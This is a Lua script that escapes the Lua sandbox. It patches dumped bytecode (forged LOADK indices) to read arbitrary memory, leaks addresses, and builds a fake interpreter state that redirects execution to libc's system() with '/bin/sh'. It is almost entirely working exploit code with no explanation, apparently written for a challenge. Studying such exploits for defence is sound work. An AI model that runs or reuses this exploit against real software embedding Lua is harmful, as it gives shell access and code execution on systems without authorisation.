-- 2021.10.08. 22:04 수정
collectgarbage("stop")

local function escapeString(s)
	local i = 1
	local len = #s
	while(i <= len) do
		if(s:byte(i) == 0x25) then
			s = s:sub(1, i) .. '%' .. s:sub(i+1)
			len = len + 1
			i = i + 1
		end
		i = i + 1
	end
	return s
end

local function numTo32L(n)
	local a1 = n % 0x100
	local q = n  // 0x100
	local a2 = q % 0x100
	q = q // 0x100
	local a3 = q % 0x100
	q = q // 0x100
	local a4 = q
	return string.char(a1, a2, a3, a4)
end

-- number to 64bit string

local function numTo64L(n)
	local a1 = n % 0x100
	local q = n // 0x100
	local a2 = q % 0x100
	q = q // 0x100
	local a3 = q % 0x100
	q = q // 0x100
	local a4 = q % 0x100
	q = q // 0x100
	local a5 = q % 0x100
	q = q // 0x100
	local a6 = q % 0x100
	q = q // 0x100
	local a7 = q % 0x100
	q = q // 0x100
	local a8 = q % 0x100
	return string.char(a1, a2, a3, a4, a5, a6, a7, a8)
end


local function createLOADK(ra, kb)
	local Bx = kb * (1 << 15)
	local i = 0x03 + (ra * (1 << 7)) + Bx
	i = numTo32L(i)
	return i
end


local function _objAddr(o)
	return tonumber(tostring(o):match('^%a+: 0x(%x+)$'),16)
end



local function readAddr(addr)
	collectgarbage()

	local function foo()
		local a="a" a="b" a="c" 
		return (#a)
	end

	local _k={}
	local _str={}
	if (tostring(_k)>tostring(_str)) then
		local _t = _str
		_str = _k
		_k = _t
	end
	
	local _intermid={}

	local _str_addr = _objAddr(_str)
	-- table in 64bit is 56B long


	local _addr = numTo64L(addr - 16)
	local padding_a = string.rep('\65', 8) -- 0x41 padding
	local padding_b = string.rep('\20', 15) -- LUA_VLNGSTR tag padding

	collectgarbage()
	_str = nil
	_intermid=nil
	collectgarbage()
	
	_str = padding_a .. _addr .. padding_b;

	
	foo = string.dump(foo)
	foo = foo:gsub(escapeString(createLOADK(0,2)), -- 0 , 0, 32
			escapeString(createLOADK(0, (_str_addr+0x20 - _objAddr(_k))/16 ))) -- 0, 

	collectgarbage()
	_k=nil
	collectgarbage()

	foo = load(foo)
	return foo()
end



local function memcpy(src, size)
	local dest = ''
	--pointer size is 8B
	local m = size % 8
	for i=0, size-m-8, 8 do
		dest = dest .. numTo64L(readAddr(src + i))
	end
	if (m ~= 0) then
		
		local i = (size - m)/8	--Note: size%8 != 0
		dest = dest .. numTo64L(readAddr(src + i)):sub(1,m)
	end
	return dest
end


local function objAddr(o)
	local known_objects = {}
	known_objects['thread'] = 1; known_objects['function']=1; known_objects['userdata']=1; known_objects['table'] = 1;
	local tp = type(o)
	if (known_objects[tp]) then return _objAddr(o) end

	local f = function(a) coroutine.yield(a) end
	local t = coroutine.create(f)
	local top = readAddr(_objAddr(t) + 0x10) --The field top is in offset 0x10

	coroutine.resume(t, o)
	local addr = readAddr(top )

	return addr
end


local function bufferAddress(b)
	return (objAddr(b) + 0x18)
end


local function executeC(addr, arg)
	local f = function() coroutine.yield() local a = string.rep('asda', 20) end
	local t = coroutine.create(f)
	coroutine.resume(t)
	local t_addr = objAddr(t)
	
	local l_G_addr = readAddr(readAddr(t_addr) + 0x18)
    
	l_G = memcpy(l_G_addr, 1416) -- sizeof(global_State)=1416
	l_G = numTo64L(addr) .. numTo64L(arg) .. l_G:sub(17)
	l_G_addr = bufferAddress(l_G)

	local t_buffer = memcpy(t_addr, 200) -- sizeof(lua_State)=200


	t_buffer = t_buffer:sub(1,14) .. '\01\01' .. t_buffer:sub(17,24).. numTo64L(l_G_addr) .. t_buffer:sub(33)

	collectgarbage()
	t_addr = bufferAddress(t_buffer) -- t_addr = &fake_luaState

	--create TValue
	local tvl = 'paddingg' .. numTo64L(t_addr) .. '\72\00\00\00\00\00\00\00';

	t_addr = bufferAddress(tvl)+ 8;

	collectgarbage()

	collectgarbage('restart')
	
	local k = {}
	local k_addr = objAddr(k)
	while ((t_addr - k_addr) > 0x20000 or (k_addr > t_addr)) do
		k={}
		k_addr = objAddr(k)

	end

	collectgarbage('stop')

	local g = function() local a="a" coroutine.resume(a) end

	g = string.dump(g)

	g = g:gsub(escapeString(createLOADK(0,0)),
			 escapeString(createLOADK(0, (t_addr-k_addr)/16)))
             
	collectgarbage()


	local t1 = {}
	local t2 = {}
	local t3 = {}
	local t4 = {}
	local t5 = {}
	local t6 = {}
	local t7 = {}



	collectgarbage()
	k=nil
	collectgarbage()

	g, err = load(g)
	g()	
end


collectgarbage("stop")

offset = 0x43db8 - 0x26ab0
luaB_print = _objAddr(print)
system_got = luaB_print + offset
system_addr = readAddr(system_got)

local argument = '/bin/sh'
local arg_addr = bufferAddress(argument)

executeC(system_addr, arg_addr) 